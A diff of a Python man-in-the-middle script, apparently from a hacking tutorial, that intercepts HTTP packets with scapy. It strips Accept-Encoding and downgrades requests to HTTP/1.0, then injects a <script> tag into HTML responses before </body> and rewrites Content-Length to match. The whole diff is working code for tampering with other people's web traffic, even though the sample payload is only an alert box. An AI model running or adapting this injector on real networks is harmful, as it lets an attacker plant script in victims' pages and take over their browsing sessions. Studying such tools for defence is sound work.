@@ -36,19 +36,26 @@ def process(packet):
             load = sp_packet[sp.Raw].load
             if sp_packet[sp.TCP].dport == 80:
                 print("[+] HTTP request : ")
-                load = re.sub(r'Accept-Encoding:.*?\\r\\n', "", load.decode("utf-8", "backslashreplace"))
-                sp_packet = modify_load(sp_packet, load)
+                load = sp_packet[sp.Raw].load.decode("unicode-escape")
+                mod_load = re.sub(r'Accept-Encoding:.*', "", load)
+                mod_load = mod_load.replace("\n\n", "\n")
+                mod_load = mod_load.replace("HTTP/1.1", "HTTP/1.0")
+                mod_load = bytes(mod_load, "utf-8")
+                sp_packet = modify_load(sp_packet, mod_load)
+                #print(sp_packet.show())
                 packet.set_payload(bytes(sp_packet))
             elif sp_packet[sp.TCP].sport == 80:
-                injection = '<script>alert("fool");</script>'
+                injection = '<script>alert("fool");\r\n</script>'
                 print("[+] HTTP response")
-                load = load.decode("utf-8", "backslashreplace").replace("</body>", injection + "</body>")
+                load = sp_packet[sp.Raw].load.decode("utf-8", "backslashreplace")
+                load = load.replace("</body>", injection + "</body>")
                 content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
                 if content_length_search and "text/html" in load:
                     content_length = content_length_search.group(1)
                     new_content_length = int(content_length) + len(injection)
                     load = load.replace(content_length, str(new_content_length))
                     sp_packet = modify_load(sp_packet, load)
+                    packet.set_payload(bytes(sp_packet))
                     print(sp_packet.show())
 
             '''
